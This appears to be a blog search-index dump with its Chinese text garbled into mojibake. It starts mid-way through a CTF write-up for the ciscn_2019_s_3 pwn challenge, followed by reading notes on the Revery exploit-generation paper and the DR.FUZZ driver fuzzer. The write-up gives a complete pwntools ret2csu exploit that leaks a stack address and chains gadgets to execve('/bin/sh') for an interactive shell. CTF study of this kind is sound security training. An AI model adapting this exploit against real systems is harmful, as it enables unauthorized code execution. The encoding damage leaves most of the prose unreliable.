å‡½æ•°ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯è¯»ï¼Œç¬¬äºŒä¸ªæ˜¯å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å†™ä¹‹å‰æ‰“ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹å†™å…¥çš„å€¼åœ¨æ ˆä¸­çš„ä½ç½®ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° write å¯ä»¥å†™ 0x30 ä¸ªå­—èŠ‚ï¼Œè€Œ buf è·ç¦» rbp 0x16 ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸” vuln å‡½æ•°æ ˆæ²¡æœ‰ä¿å­˜ä¸Šä¸ªæ ˆå¸§çš„ rbpï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¦†ç›– 0x10 ä¸ªå­—èŠ‚å°±å¤Ÿäº†ï¼Œé‚£ä¹ˆå¯ä»¥æš´éœ²æ ˆä¸Šæ•°æ® 0x20 ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é™¤å»è¦†ç›–å­—ç¬¦å å»çš„ 16 ä¸ªå­—èŠ‚ååœ¨0x7fffffffdeb0 å¤„å­˜äº†ä¸€ä¸ªæ ˆåœ°å€0x7fffffffdfa8ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†å…¶æš´éœ²ã€‚0x7fffffffdfa8 è·ç¦»0x7fffffffde90 çš„åç§»æ˜¯0x00007fffffffdfa8-0x7fffffffde90=0x118ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°†å¾—åˆ°çš„å€¼å‡å» 0x118 å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡åœ°å€å•¦ã€‚ ä¸‹é¢æ˜¯å®Œæ•´çš„ exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * elf = ELF(\u0026#34;ciscn_s_3\u0026#34;) p = process(\u0026#34;./ciscn_s_3\u0026#34;) # p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,29348) vuln = elf.symbols[\u0026#39;vuln\u0026#39;] csu_pop = 0x040059A csu_mov = 0x0400580 syscall = 0x400501 execve = 0x004004E2 # mov eax 3Bh ret = 0x400519 pop_rdi_ret = 0x04005A3 #æš´éœ²æ ˆä¸­åœ°å€ payload = b\u0026#39;a\u0026#39; * 0x10 + p64(vuln) p.sendline(payload) p.recv(0x20) buf = u64(p.recv(0x8)) - 0x118 print(hex(buf)) payload = p64(ret) + b\u0026#39;/bin/sh\\x00\u0026#39; + p64(csu_pop) payload += p64(0) + p64(0) #rbxä¸º0 rbpä¸º1 payload += p64(buf) #call [12] == ret payload += p64(0) * 3 #è¿™é‡Œä¸èƒ½å°†bin/shçš„åœ°å€ç›´æ¥ç»™r13ï¼Œå› ä¸ºr13ç»™rdiçš„ä½32ä½ï¼Œé«˜32ä½æ²¡åŠæ³•å¼„ï¼Œæ‰€ä»¥è¦ç”¨åˆ«çš„gadget payload += p64(csu_mov) payload += p64(0) * 7 #è¿™é‡Œçš„7ä¸ªä¸èƒ½ç†è§£ï¼Œæ˜æ˜æ˜¯popäº†6ä¸ªå¯„å­˜å™¨å‘€ payload += p64(execve) payload += p64(pop_rdi_ret) payload += p64(buf + 8) payload += p64(syscall) p.sendline(payload) p.interactive() ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/ret2csu%E4%BB%A5ciscn_2019_s_3%E4%B8%BA%E4%BE%8B%E5%AD%90/","summary":"å‚è€ƒï¼š(67æ¡æ¶ˆæ¯) ä¸­çº§ROPä¹‹ret2csu_è¥¿æ­çš„åšå®¢-CSDNåšå®¢ é€‚ç”¨åœºæ™¯ åœ¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€…åœ¨ 64 ä½ç¨‹åºä¸­é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œ","title":"ret2csuï¼ˆä»¥ciscn_2019_s_3ä¸ºä¾‹å­ï¼‰"},{"content":"ä¸­æ–‡è¯‘åï¼šrevery: ä»æ¦‚å¿µéªŒè¯åˆ°å¯åˆ©ç”¨ ä½œè€…ï¼šYan Wang å•ä½ï¼šIIE å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #ccs å…³é”®å­—ï¼š #AGE #fuzzing ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-17 14:32 #TODO\nABSTRACT exploitable states do not always exist in crashing paths existing solutions heavily rely on symbolic execution and not scalable in path exploration and exploit generation few solutions could exploit heap-based vulnerabilities Revery can search exploitable statess in paths divering from crashing paths and generate control-flow hijacking exploits for heap-based vulnerabilities. a layout-contributor digraph ç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/revery-from-proof-of-concept-to-exploitable/","summary":"ä¸­æ–‡è¯‘åï¼šrevery: ä»æ¦‚å¿µéªŒè¯åˆ°å¯åˆ©ç”¨ ä½œè€…ï¼šYan Wang å•ä½ï¼šIIE å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #ccs å…³é”®å­—ï¼š #AGE #fuzzing ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´","title":"Revery from Proof-of-Concept to Exploitable"},{"content":"ä¸­æ–‡è¯‘åï¼šä¸éœ€è¦ç¡¬ä»¶è®¾å¤‡å’Œæ¨¡æ‹Ÿå™¨çš„è¯­ä¹‰é©±åŠ¨æ¨¡ç³Š ä½œè€…ï¼šWenjia Zhao å•ä½ï¼šè¥¿å®‰äº¤é€šå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #NDSSä¼šè®® å…³é”®å­—ï¼š #fuzzing #ä»¿çœŸæ‰˜ç®¡ ä»£ç åœ°å€ï¼šsecsysresearch/DRFuzz (github.com) ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-03-13 10:24\næ‘˜è¦ èƒŒæ™¯ï¼š\né©±åŠ¨æ¥æ”¶æ¥è‡ªç”¨æˆ·ç©ºé—´æˆ–ç¡¬ä»¶çš„å¤æ‚ä¸”ä¸å¯ä¿¡çš„è¾“å…¥ é©±åŠ¨ä»£ç æœ¬èº«ä¸å¯é ï¼Œå¼€å‘å¼€å‘äººå‘˜ç»éªŒå°‘ï¼Œå¼€å‘ç»“æŸåéš¾æµ‹è¯• ç›®çš„ï¼šæ„å»ºä¸éœ€è¦è®¾å¤‡çš„é©±åŠ¨ fuzzing ç³»ç»Ÿ æ–¹æ³•ï¼š\né€šè¿‡ semantic-informed æœºåˆ¶å¯ä»¥é«˜æ•ˆç”Ÿæˆå¯ä»¥é€šè¿‡éªŒè¯é“¾çš„è¾“å…¥ï¼Œæ‰€ä»¥ä¸éœ€è¦ç¡¬ä»¶è®¾å¤‡äº† æ¨æ–­åˆæ³•çš„è¾“å…¥å€¼ æ¨æ–­è¾“å…¥å­—èŠ‚çš„æ—¶é—´ä½¿ç”¨é¡ºåºæ¥ç¼©å°å˜å¼‚ç©ºé—´ ä½¿ç”¨é”™è¯¯çŠ¶æ€ä½œä¸ºåé¦ˆæ¥æŒ‡å¯¼ fuzzing é€šè¿‡éªŒè¯é“¾ semantic-informed æœºåˆ¶æ˜¯é€šç”¨çš„ å¯ä»¥ç”ŸæˆåŠç•¸å½¢è¾“å…¥æ¥æé«˜è¦†ç›–ç‡ æ•ˆæœï¼šåœ¨ 214 ä¸ª Linux é©±åŠ¨ç¨‹åºä¸Šè¯„ä¼° DR. FUZZã€‚åœ¨ 24 å°æ—¶çš„æ—¶é—´é¢„ç®—ä¸‹ï¼ŒDR. FUZZ å¯ä»¥åœ¨æ²¡æœ‰ç›¸åº”è®¾å¤‡çš„æƒ…å†µä¸‹æˆåŠŸåˆå§‹åŒ–å’Œå¯ç”¨å¤§å¤šæ•°é©±åŠ¨ç¨‹åºï¼Œè€Œç°æœ‰çš„ fuzzer å¦‚ syzkaller åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½æ— æ³•æˆåŠŸã€‚DR. FUZZ åœ¨å…¶ä»–æ–¹é¢ä¹Ÿæ˜æ˜¾ä¼˜äºç°æœ‰çš„ç”šè‡³é…å¤‡äº†è®¾å¤‡æˆ–æ¨¡æ‹Ÿå™¨çš„é©±åŠ¨ç¨‹åºæ¨¡ç³Šå™¨: å®ƒå°†ä»£ç è¦†ç›–ç‡æé«˜äº† 70%ï¼Œååé‡æé«˜äº† 18%ã€‚é€šè¿‡ DR. FUZZï¼Œæˆ‘ä»¬è¿˜åœ¨è¿™äº› Linux é©±åŠ¨ç¨‹åºä¸­å‘ç°äº† 46 ä¸ªæ–°é”™è¯¯ã€‚\n1å¼•è¨€ èƒŒæ™¯ï¼šé©±åŠ¨ç¨‹åºå…³é”®ä¸”è„†å¼± ç°çŠ¶ï¼šå½“å‰çš„é©±åŠ¨ fuzzing éƒ½éœ€è¦ç¡¬ä»¶æˆ–è€…æ¨¡æ‹Ÿå™¨\nç¡¬ä»¶éš¾æ æ¨¡æ‹Ÿå™¨æ”¯æŒçš„ä¸å¤š å³ä½¿æœ‰ç¡¬ä»¶æˆ–è€…æ¨¡æ‹Ÿå™¨ï¼Œä½†æ˜¯ç”Ÿæˆçš„è¾“å…¥ä¸å¤Ÿç•¸å½¢ï¼Œéš¾ä»¥è§¦å‘æ¼æ´ æ–¹æ³•ï¼š\nå…³é”®åœ¨äºè¾“å…¥è¦é€šè¿‡éªŒè¯é“¾ï¼Œé€šè¿‡éªŒè¯é“¾å°±æ„å‘³ç€é©±åŠ¨åˆå§‹åŒ–æˆåŠŸ Semantic-informed æœºåˆ¶æ¨æ–­ä¸åŒçš„è¯­ä¹‰ä¿¡æ¯æ¥æœ‰æ•ˆçš„ç”Ÿæˆåˆæ³•çš„è¾“å…¥ ä¸ºäº†å‡å°è¿‡å¤§çš„è¾“å…¥ç©ºé—´ï¼Œä½œè€…é‡‡ç”¨ä¸€ä¸‹ä¸‰ç§æ–¹æ³• å­—èŠ‚çº§ï¼Œå­—æ®µæ•æ„Ÿçš„å€¼æ¨æ–­å’Œæ˜ å°„ï¼šå­—æ®µæ•æ„Ÿåˆ†ææ„å»º I/O ä¾èµ–å›¾ï¼ŒåŸºäºå›¾é€šè¿‡å­—èŠ‚çº§çš„åˆ†ææ¨æ–­å­—æ®µçš„å¯èƒ½å€¼ï¼›å¹¶ä¸”å°†å­—æ®µæ˜ å°„åˆ°ç‰¹å®šåœ°å€çš„è¾“å…¥å­—èŠ‚ã€‚ åŸºäºæ—¶é—´åºåˆ—çš„å­—èŠ‚ä¼˜å…ˆçš„æ¨æ–­ï¼šè§‚å¯Ÿåˆ°éªŒè¯é“¾éµå¾ªæŸç§æ—¶åºæ¨¡å‹ï¼ŒåŸºäºæ­¤æ¨æ–­å­—èŠ‚çš„ï¼ˆå˜å¼‚ï¼‰ä¼˜å…ˆçº§ï¼Œæ¯æ¬¡å˜å¼‚ä¸“æ³¨äºæŸå‡ ä¸ªå­—èŠ‚ï¼Œä»¥æ­¤æ¥å‡å°å˜å¼‚ç©ºé—´ é”™è¯¯çŠ¶æ€ä½œä¸º fuzzing åé¦ˆï¼šå°†é”™è¯¯çŠ¶æ€åé¦ˆå’Œä»£ç è¦†ç›–ç»“åˆæ¥å¼•å¯¼æ¨¡ç³Šå™¨ é‡ç”¨è¯­ä¹‰é€šçŸ¥æœºåˆ¶ä½œä¸ºåŠç•¸å½¢è¾“å…¥ç”Ÿæˆå™¨ï¼Œä»¥æé«˜é©±åŠ¨æ¨¡ç³Šçš„ä»£ç è¦†ç›–ç‡å’Œååé‡ã€‚ é«˜è¦†ç›–ç‡é©±åŠ¨ç¨‹åº fuzzer éœ€è¦æ ¼å¼è‰¯å¥½çš„è¾“å…¥æ¥åˆ°è¾¾æ·±åº¦è·¯å¾„ï¼Œä½†ä¹Ÿéœ€è¦æ ¼å¼ä¸è‰¯çš„è¾“å…¥æ¥è§¦å‘å®½è·¯å¾„ã€‚ 2 è®¾å¤‡é©±åŠ¨ç¨‹åºçš„è¡¨å¾ç ”ç©¶ A The Linux Kernel Device Model ä¸Šå›¾æ˜¯ LKDM (Linux Kernel Device Model)\næ¯å±‚éƒ½æœ‰ä¸åŒçš„æ•°æ®ç»“æ„æ¥è¡¨ç¤ºè®¾å¤‡çŠ¶æ€å’Œè®°å½•å¯ç”¨çš„æ“ä½œï¼ˆåˆ©ç”¨å‡½æ•°æŒ‡é’ˆï¼‰ è¿™ç§å±‚æ¬¡ç»“æ„æå¤§åœ°ç®€åŒ–äº†è®¾å¤‡ç®¡ç†â€”â€”æ€»çº¿é©±åŠ¨ç¨‹åºå®šä¹‰äº†è®¾å¤‡é©±åŠ¨ç¨‹åºåº”è¯¥å®ç°çš„æ¥å£ï¼Œå†…æ ¸ä½¿ç”¨è¿™äº›æ¥å£æ¥ç®¡ç†è®¾å¤‡ã€‚ è®¾å¤‡æ¨¡å‹è¡¨æ˜ï¼Œè®¾å¤‡æ˜¯é€šè¿‡ä¸€ç»„æ•°æ®ç»“æ„å’Œåœ¨ç›¸åº”é©±åŠ¨ç¨‹åºä¸­å®ç°çš„æ“ä½œæ¥ç»Ÿä¸€ç»„ç»‡å’Œç®¡ç†çš„ã€‚ B The Two-Stage Workflow of Drivers å·¥ä½œæµæœ‰ä¸¤ä¸ªé˜¶æ®µ: é©±åŠ¨ç¨‹åºåˆå§‹åŒ–å’Œé©±åŠ¨ç¨‹åºä¸è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ã€‚ é˜¶æ®µä¸€ï¼šç»“æ„ä¸­å¿ƒåˆå§‹åŒ–\nKernel é¦–å…ˆé€šè¿‡æ‰«ææ€»çº¿å‘ç°è®¾å¤‡ï¼Œæ ¹æ®è®¾å¤‡ç‰¹æ€§åŒ¹é…ç›¸åº”é©±åŠ¨ æ€»çº¿é©±åŠ¨æ ¹æ®è®¾å¤‡è¾“å…¥æ„å»ºåŸºæœ¬è®¾å¤‡ç»“æ„ï¼Œè®¾å¤‡é©±åŠ¨åŸºäºæ­¤æ„å»ºæ›´å…·ä½“çš„ç»“æ„ æ€»çº¿é©±åŠ¨è°ƒç”¨è®¾å¤‡é©±åŠ¨çš„ç»“æ„æ¥å¯¹è®¾å¤‡åˆå§‹åŒ–ï¼Œåˆ†é…å¿…è¦èµ„æº ä¸€æ—¦åˆå§‹åŒ–å®Œæˆï¼Œå†…æ ¸å°±å¯ä»¥é€šè¿‡è¿™äº›è®¾å¤‡ç»“æ„å’Œé©±åŠ¨ç¨‹åºä¸­ç›¸åº”çš„æ“ä½œå‡½æ•°ä¸è®¾å¤‡äº¤äº’ã€‚ é˜¶æ®µäºŒï¼šé©±åŠ¨å’Œè®¾å¤‡ä¹‹é—´çš„é€šä¿¡\nå†…æ ¸å¯ä»¥é€šè¿‡é©±åŠ¨å‡½æ•°æ¥æ£€æŸ¥è®¾å¤‡çŠ¶æ€å’Œä¸è®¾å¤‡é€šä¿¡ å¤§å¤šæ•°è®¾å¤‡ä¼šæä¾›ç”¨æˆ·ç©ºé—´çš„æ¥å£ï¼Œç”¨æˆ·ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨æˆ–è€…ç”¨æˆ·ç©ºé—´çš„æ¥å£æ¥æ“ä½œè®¾å¤‡ C Is Device-Free Driver Fuzzing Feasible? â€“ The InputValidation Chains! æƒ³è¦æˆåŠŸåˆå§‹åŒ–é©±åŠ¨ï¼Œå°±è¦é€šè¿‡éªŒè¯é“¾ã€‚ä½œè€…ä¾æ®å¯¹éªŒè¯é“¾çš„åˆ†æï¼Œå‘ç°äº†ä¸€ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š\næ—¶åºè¾“å…¥çš„ä½¿ç”¨ï¼šå¯¹è¾“å…¥å­—èŠ‚çš„éªŒè¯å’Œä½¿ç”¨æŒ‰æ—¶é—´é¡ºåºä¾æ¬¡å‘ç”Ÿï¼Œå¹¶ä¸”æ¯ä¸ªéªŒè¯å’Œä½¿ç”¨éƒ½åªé’ˆå¯¹ä¸€ä¸ªæˆ–å‡ ä¸ªå­—èŠ‚ï¼Œè€Œä¸æ˜¯å…¨éƒ¨å­—èŠ‚â€”â€”fuzzing ä¸éœ€è¦å˜å¼‚æ•´ä¸ªå­—èŠ‚ï¼Œè€Œå¯èƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°å˜å¼‚ï¼Œè¿™å°†æå¤§åœ°å‡å°‘å˜å¼‚ç©ºé—´ã€‚ ç¡¬ç¼–ç çš„ I/O åœ°å€-å€¼æ˜ å°„ï¼šæ€»çº¿å’Œé©±åŠ¨ä»è®¾å¤‡è¯»å…¥åœ°å€å’Œæ•°æ®å¤§å°æ¥åˆå§‹åŒ–è®¾å¤‡å¯¹åº”çš„æ•°æ®ç»“æ„ã€‚åœ°å€å’Œæ•°æ®å¤§å°æ˜¯ç¡¬ç¼–ç å†™åœ¨é©±åŠ¨ä¸­çš„å¸¸æ•°ï¼Œæ¢å¤è¿™äº›å¸¸æ•°ä¼šå¸®åŠ©ä½œè€…æ„å»ºè®¾å¤‡çš„ç‰¹å®šåç§»é‡çš„è¾“å…¥å’Œå®ƒä»¬åœ¨é©±åŠ¨ç¨‹åºä»£ç ä¸­çš„å¼•ç”¨ä¹‹é—´çš„æ˜ å°„ã€‚ï¼ˆæˆ‘ç†è§£ä¸ºä¼ æŸ“æ€»çº¿é©±åŠ¨çš„ä»£ç åœ°å€å’Œè®¾å¤‡é©±åŠ¨ä¸­çš„ä»£ç ä¹‹é—´çš„æ˜ å°„ï¼‰ æ™®éçš„é”™è¯¯å¤„ç†ï¼šä¾æ®é©±åŠ¨è¿”å›çš„é”™è¯¯çŠ¶æ€æ¥æ¨æ–­ fuzzer ç”Ÿæˆçš„è¾“å…¥ä¸­çš„å­—èŠ‚å€¼æ˜¯å¦æ­£ç¡®ã€‚ å…¶ä»–å‘ç°ï¼šåœ¨åˆå§‹åŒ–ä¸­é©±åŠ¨ä¼šé‡‡ç”¨ MMIO æˆ– DMA çš„æ–¹å¼æ¥è®¿é—®è®¾å¤‡ I/O åœ°å€ç©ºé—´ã€‚ 3 DR. FUZZ çš„ overview A æŠ€æœ¯æŒ‘æˆ˜ DR. FUZZ çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ fuzzing ç”Ÿæˆæ­£ç¡®çš„è¾“å…¥æ¥æ„å»ºæ­£ç¡®çš„è®¾å¤‡ç›¸å…³ç»“æ„ã€‚æ­£ç¡®çš„è¾“å…¥æ„å‘³ç€å†…æ ¸éœ€è¦çŸ¥é“ (1) ä»å“ªä¸ªåœ°å€è¯»å–ï¼Œ(2) åº”è¯¥è¯»å–ä»€ä¹ˆå€¼ã€‚\næŒ‘æˆ˜ 1ï¼šæå…¶å¤æ‚çš„æ•°æ®ç»“æ„å¯¼è‡´è¾“å…¥ç©ºé—´å¤§ æŒ‘æˆ˜ 2ï¼šå¤æ‚å¤šæ ·çš„ I/O å¯»å€ B è§£å†³æ–¹æ³•æ¦‚è¿° æŒ‘æˆ˜ 1ï¼šå°½é‡å‡å°‘ç›¸å…³æ•°æ®ç»“æ„çš„æ•°é‡ï¼Œä»¥åŠå®ƒä»¬å­—æ®µçš„å¯èƒ½å€¼çš„èŒƒå›´ã€‚ é€šè¿‡ç²¾ç¡®çš„é™æ€åˆ†ææ¥æ„å»ºä¾èµ–äº I/O çš„å›¾æ¥è¯†åˆ«é©±åŠ¨ç¨‹åºä¸­ä¸è®¾å¤‡ç›¸å…³çš„æ•°æ®ç»“æ„ä»¥åŠè¿™äº›æ•°æ®ç»“æ„ä¸­ä¸ I/O ç›¸å…³çš„å­—æ®µã€‚ ç„¶åæå–è¿™äº›å­—æ®µï¼Œä¿ç•™æ„Ÿå…´è¶£çš„å­—æ®µ é€šè¿‡å­—èŠ‚çº§å’Œå­—æ®µæ•æ„Ÿçš„åˆ†ææ¥ç¡®å®šå­—æ®µçš„éªŒè¯é“¾ é€šè¿‡åˆ†æéªŒè¯é“¾ï¼Œä½¿ç”¨å­—æ®µæ•æ„Ÿåˆ†æä»åˆ†æ”¯è¯­å¥ä¸­æ”¶é›†çº¦æŸ (å³ä¾èµ–å€¼)ï¼Œè¿™æœ‰åŠ©äºç¡®å®šå­—æ®µçš„å€™é€‰å€¼é›†ã€‚ åŸºäºéªŒè¯é“¾éµå¾ªæ—¶åºçš„ç‰¹ç‚¹ï¼Œä½œè€…æå‡ºå­—èŠ‚ä¼˜å…ˆï¼ˆæ—¶åºï¼‰æ¨æ–­ï¼Œä»¥ç¡®å®šå“ªäº›å­—æ®µçš„å“ªäº›å­—èŠ‚åº”å½“é¦–å…ˆæ„é€ ï¼Œè¿™å¯ä»¥æ˜¾è‘—å‡å°‘è¾“å…¥çªå˜ç©ºé—´ã€‚ æŒ‘æˆ˜ 2ï¼šåœ¨è·å¾—å€™é€‰å€¼å’Œå­—èŠ‚ä¼˜å…ˆçº§ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†æ­¤ä¿¡æ¯ä¸è®¾å¤‡çš„ç‰¹å®š I/O åœ°å€ç›¸å…³è”ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥åœ¨æ­£ç¡®çš„åœ°å€å¤„å‡†å¤‡å€¼ã€‚ é¦–å…ˆè¯†åˆ« I/O åœ°å€åœ¨é©±åŠ¨ç¨‹åºä»£ç ä¸­ç¡¬ç¼–ç çš„å­—æ®µï¼ˆå’‹è¯†åˆ«ï¼Ÿï¼‰ï¼Œå°†è¿™äº›å­—æ®µæ˜ å°„åˆ° I/O ç«¯å£/MMIO è¯­å¥çš„å¸¸æ•°å‚æ•°ï¼Œè¿™å°±æ„æˆäº† I/O åœ°å€-å€¼æ˜ å°„ã€‚ï¼ˆè¿™ä¸ªæ˜ å°„æ—¶ç”¨æ¥æŒ‡æ˜ä¸Šé¢ç”Ÿæˆçš„å€¼æ”¾åˆ°å“ªä¸ª I/O åœ°å€ï¼‰ å¯¹äºæ²¡æœ‰ç¡¬ç¼–ç æ˜ å°„çš„æƒ…å†µï¼Œé‡‡ç”¨åŠ¨æ€æ˜ å°„åˆ†æã€‚ C æ¡†æ¶å’Œç»„ä»¶ åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š\nSemantic-iniformed æœºåˆ¶ï¼šè¯¥éƒ¨åˆ†é™æ€åœ°æ”¶é›†è¯­ä¹‰ä¿¡æ¯ï¼ŒæŒ‡ç¤ºé©±åŠ¨ç¨‹åºä»£ç ï¼Œåœ¨è¿è¡Œæ—¶è·å¾—åé¦ˆï¼Œå¹¶æ”¹å˜å½“å‰è¾“å…¥ é©±åŠ¨æ¨¡ç³Šæ¡†æ¶ï¼šå®ƒç®¡ç† VM çš„è¿è¡Œï¼Œå¹¶é€šè¿‡è®¾å¤‡é€‚é…å™¨å°† fuzzer è¾“å‡ºæ³¨å…¥ VM å†…æ ¸ï¼Œåœ¨è¿™ä¸ªæ¡†æ¶ä¸­ï¼Œæœ€é‡è¦å’Œæœ€ç‹¬ç‰¹çš„è®¾è®¡æ˜¯ I/O æ‹¦æˆªå’Œæ•°æ®æ³¨å…¥ã€‚å®ƒé¦–å…ˆæ‹¦æˆªç›®æ ‡è®¾å¤‡ I/O è®¿é—®ï¼Œç„¶åå°†åœ°å€å’Œå¤§å°è½¬å‘ç»™ fuzzerã€‚ç„¶åï¼Œè¯¥æ¡†æ¶ä½¿ç”¨ fuzzer è¾“å‡ºä½œä¸ºè®¾å¤‡è¾“å…¥ï¼Œå°†æ•°æ®æ³¨å…¥ QEMU è™šæ‹Ÿå†…å­˜åŒºåŸŸã€‚ è¯­ä¹‰åˆ†æ æå–å¤šç§æœ‰ç”¨çš„è¯­ä¹‰ä¿¡æ¯å¹¶ç”Ÿæˆè¯­ä¹‰åº“ï¼ˆå›¾ä¸­ 1bï¼‰ï¼Œè¯­ä¹‰åº“åŒ…å«äº†æ¨æ–­çš„å€¼ã€‚ åœ¨é©±åŠ¨ä»£ç æ’æ¡©æ•æ‰é”™è¯¯çŠ¶æ€ï¼ˆ1aï¼‰ Fuzzer ç®¡ç† VM å¿«ç…§â€”â€”ç”¨äºæ¯æ¬¡å˜å¼‚åçš„è¿è¡Œ ç”Ÿæˆè¾“å…¥æ•°æ® æ¥å—é”™è¯¯çŠ¶æ€è¿›è¡Œå˜å¼‚ è®¾å¤‡é€‚é…å™¨ ç”±äºä¸åŒæ€»çº¿ä¸Šçš„è®¾å¤‡åœ°å€ä¸åŒï¼Œè®¾å¤‡é€‚é…å™¨è´Ÿè´£å°†ç»™å®šçš„å‡è®¾å¤‡åœ°å€â€œé™„åŠ â€åˆ°é€‚å½“çš„æ€»çº¿ä¸Šã€‚hypervisor å°† I/O ç«¯å£/MMIO/DMA çš„æ‰€æœ‰è¾“å…¥/è¾“å‡ºè½¬å‘åˆ°é€‚é…å™¨ï¼Œfuzzer å°†çªå˜æ•°æ®ä½œä¸ºè®¾å¤‡è¾“å…¥æ³¨å…¥ï¼Œå¹¶é€šè¿‡è¿™ä¸ªé€‚é…å™¨ä¸­æ–­åˆ°è®¾å¤‡é©±åŠ¨ç¨‹åº ä¿®æ”¹çš„ KVM æ¨¡å— ä¿®æ”¹åçš„ KVM æ¨¡å—æ•è·å¹¶è§£ææ‰§è¡Œæ–°çš„ VMCALL æŒ‡ä»¤å¯¼è‡´çš„è™šæ‹Ÿæœºé€€å‡ºã€‚è¿™äº› VMCALL æŒ‡ä»¤ç”±è¯­ä¹‰åˆ†æå·¥å…·æ’å…¥åˆ°é©±åŠ¨ç¨‹åºä¸­ (1a)ã€‚å½“é©±åŠ¨ç¨‹åºæ‰§è¡Œè§¦å‘è¿™äº› VMCALL æŒ‡ä»¤æ—¶ï¼Œvm é€€å‡ºå‘ç”Ÿï¼Œè¯¥æ¨¡å—ä» vm é€€å‡ºä¼ é€’çš„å¯„å­˜å™¨ RCX ä¸­æå–ä¸€ä¸ªå‚æ•°ã€‚è¯¥å‚æ•°è¡¨ç¤ºå‡ºå£ (4) çš„ä½ç½®ã€‚æœ€åï¼ŒKVM æ¨¡å‹å°† KVM å‡ºå£ä¿¡æ¯å‘é€ç»™ fuzzerï¼Œå¼•å¯¼å…¶çªå˜ (5)ã€‚\nç”¨æˆ·æ¨¡å¼ä»£ç† ä»£ç†æ˜¯è¿è¡Œåœ¨è™šæ‹Ÿæœºç”¨æˆ·ç©ºé—´ä¸­çš„ç¨‹åºã€‚å½“é©±åŠ¨ç¨‹åºåˆå§‹åŒ–æ—¶ï¼Œæ§åˆ¶æµè¢«è½¬ç§»åˆ°è¿™ä¸ªç¨‹åºã€‚å®ƒè‡ªåŠ¨æ‰§è¡Œé¢„å®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨æ¥è§¦å‘é©±åŠ¨ç¨‹åºå‡½æ•°çš„æ‰§è¡Œã€‚\n4 SEMANTIC-INFORMED MECHANISM A è¯­ä¹‰åˆ†æ å­—èŠ‚çº§å’Œå­—æ®µæ•æ„Ÿå€¼æ¨æ–­ : è¯†åˆ«ä¾èµ–äº I/ o çš„å­—æ®µå¹¶æ„å»ºå›¾å½¢ é‡‡ç”¨å¯¹é©±åŠ¨ç¨‹åºä¸­æ•°æ®ç»“æ„çš„æ‰€æœ‰å­—æ®µä½¿ç”¨åå‘å­—æ®µæ•æ„Ÿçš„æ•°æ®æµåˆ†ææ¥è¯†åˆ«ä¾èµ–äº I/O çš„å­—æ®µ åå‘åˆ†æçš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªå­—æ®µçš„æºï¼Œå¦‚æœæºæ˜¯è®¾å¤‡è¾“å…¥ï¼Œå³ I/O æŒ‡ä»¤çš„ç›®çš„æ“ä½œæ•°ï¼Œæˆ‘ä»¬å°±ç¡®è®¤ç›¸åº”çš„å­—æ®µä¾èµ–äº I/Oã€‚ æ ¹æ®æ•°æ®æµå¾—åˆ°ä¸€ä¸ªä¾èµ–äº I/ o çš„å›¾ (å¦‚å›¾ 5 çš„å·¦ä¾§æ‰€ç¤º)ã€‚å®ƒçš„èŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªå­—æ®µå˜é‡ï¼Œè¾¹è¡¨ç¤ºä¸¤ä¸ªå˜é‡ä¹‹é—´çš„æ•°æ®æµã€‚ è¯†åˆ«éªŒè¯é“¾ã€å…³é”®å­—æ®µåŠå…¶å€¼ ç›®çš„ï¼šè¯†åˆ«éªŒè¯é“¾ä¼šä½¿ç”¨åˆ°çš„å­—æ®µï¼Œå¹¶ä¸”æ”¶é›†é¢„æœŸçš„æœ‰æ•ˆå€¼ 